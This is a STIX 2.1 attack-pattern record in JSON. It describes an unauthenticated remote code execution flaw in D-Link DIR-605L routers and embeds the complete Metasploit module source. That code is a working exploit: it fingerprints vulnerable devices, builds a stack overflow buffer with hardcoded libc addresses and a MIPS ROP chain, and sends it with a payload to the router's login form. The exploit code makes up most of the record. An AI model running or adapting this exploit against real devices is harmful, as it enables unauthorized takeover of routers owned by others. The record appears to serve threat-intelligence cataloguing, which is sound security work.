{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d0d05d5-9885-49f5-8a43-d9e46cbdf3f2",
    "created": "2024-08-14T17:02:11.680158Z",
    "modified": "2024-08-14T17:02:11.680162Z",
    "name": "D-Link DIR-605L Captcha Handling Buffer Overflow",
    "description": " This module exploits an anonymous remote code execution vulnerability on D-Link DIR-605L routers. The vulnerability exists while handling user supplied captcha information, and is due to the insecure usage of sprintf on the getAuthCode() function. This module has been tested successfully on D-Link DIR-605L firmware 1.13 (emulated) and firmware 1.12 (real). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dir605l_captcha_bof.rb",
            "external_id": "dlink_dir605l_captcha_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # Because only has been tested on a QEMU emulated environment\n\n  HttpFingerprint = { :pattern => [ /Boa/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link DIR-605L Captcha Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits an anonymous remote code execution vulnerability on D-Link DIR-605L routers. The\n        vulnerability exists while handling user supplied captcha information, and is due to the\n        insecure usage of sprintf on the getAuthCode() function. This module has been tested\n        successfully on D-Link DIR-605L firmware 1.13 (emulated) and firmware 1.12 (real).\n      },\n      'Author'         =>\n        [\n          'Craig Heffner', # Vulnerability discovery, original exploit\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 3000,\n          'BadChars'    => \"\\x00\\x67\\x26\\x2b\"\n        },\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSBE,\n      'References'     =>\n        [\n          [ 'OSVDB', '86824' ],\n          [ 'URL', 'http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/' ]\n        ],\n      'Targets'        =>\n        [\n          [ 'D-Link DIR-605L 1.13', # Works on 1.12 as well\n            {\n              'Offset'      => 94,\n              'LibcBase'    => 0x2ab86000, # According to Original Exploit by Craig Heffner\n              'ApmibBase'   => 0x2aaef000, # According to Original Exploit by Craig Heffner\n              #'LibcBase'    => 0x4212e000, # QEMU environment\n              #'ApmibBase'   => 0x42095000, # QEMU environment\n              #LOAD:000248D4  li      $a0, 1   ; set $a0 for the sleep() call\n              #LOAD:000248D8  move    $t9, $s1 ; $s1 is controlled after the overflow\n              #LOAD:000248DC  jalr    $t9\n              'Ret'         => 0x248D4, # from libc\n              #LOAD:0002B954  move    $t9, $s2 # Controlled\n              #LOAD:0002B958  lw      $ra, 0x30+var_4($sp)  # allows to get controlled $ra from the stack\n              #LOAD:0002B95C  lw      $s4, 0x30+var_8($sp)\n              #LOAD:0002B960  lw      $s3, 0x30+var_C($sp)\n              #LOAD:0002B964  lw      $s2, 0x30+var_10($sp)\n              #LOAD:0002B968  lw      $s1, 0x30+var_14($sp) # allows to get controlled $s1 from the stack\n              #LOAD:0002B96C  lw      $s0, 0x30+var_18($sp)\n              #LOAD:0002B970  jr      $t9\n              'RopJmpSleep' => 0x2B954, # from libc\n              'RopSleep'    => 0x23D30, # from libc # Sleep Function Address # sleep() to flush the data cache\n              #LOAD:000027E8  move    $t9, $s1 # Controlled\n              #LOAD:000027EC  jalr    $t9 ; sub_22D0\n              #LOAD:000027F0  addiu   $a2, $sp, 0x40+var_24 ; put pointer to the stack on $a2 # executed because of pipelining\n              'RopPtrStack' => 0x027E8, # from apmi\n              #LOAD:00001D78  move    $t9, $a2 ; $a2 contains a poiner to the stack\n              #LOAD:00001D7C  jalr    $t9\n              'RopJmpStack' => 0x01D78 # from apmi\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-10-08',\n      'DefaultTarget' => 0))\n\n  end\n\n  def check\n    res = send_request_cgi({ 'uri' => '/comm.asp' })\n    if res and res.code == 200 and res.body =~ /var modelname=\"DIR-605L\"/ and res.headers[\"Server\"] and res.headers[\"Server\"] =~ /Boa\\/0\\.94\\.14rc21/\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    shellcode = \"\"\n    shellcode << rand_text(target['Offset'])                             # Padding\n    shellcode << rand_text(4)                                            # $s0\n    shellcode << [target['LibcBase'] + target['RopJmpSleep']].pack(\"N\")  # $s1\n    shellcode << [target['LibcBase'] + target['RopSleep']].pack(\"N\")     # $s2\n    shellcode << rand_text(4)                                            # $s3\n    shellcode << [target['LibcBase'] + target.ret].pack(\"N\")             # $ra\n    shellcode << rand_text(0x1c)                                         # filler\n    shellcode << rand_text(4)                                            # $s0\n    shellcode << [target['ApmibBase'] + target['RopJmpStack']].pack(\"N\") # $s1\n    shellcode << rand_text(4)                                            # $s2\n    shellcode << rand_text(4)                                            # $s3\n    shellcode << rand_text(4)                                            # $s4\n    shellcode << [target['ApmibBase'] + target['RopPtrStack']].pack(\"N\") # $ra\n    shellcode << rand_text(0x1c)                                         # filler\n    shellcode << payload.encoded                                         # shellcode\n\n    print_status(\"Sending exploit...\")\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"/goform/formLogin\",\n      'encode_params' => false,\n      'vars_post' => {\n        'VERIFICATION_CODE' => 'myvoiceismypassportverifyme',\n        'VER_CODE'          => '1234',\n        'login_n'           => 'admin',\n        'FILECODE'          =>  shellcode,\n        'curTime'           => '1348588030496',\n        'login_pass'        => 'Zm9vb255b3UA',\n        'login_name'        => 'admin'\n      }\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-08",
    "x_mitre_platforms": [
        "['linux']"
    ]
}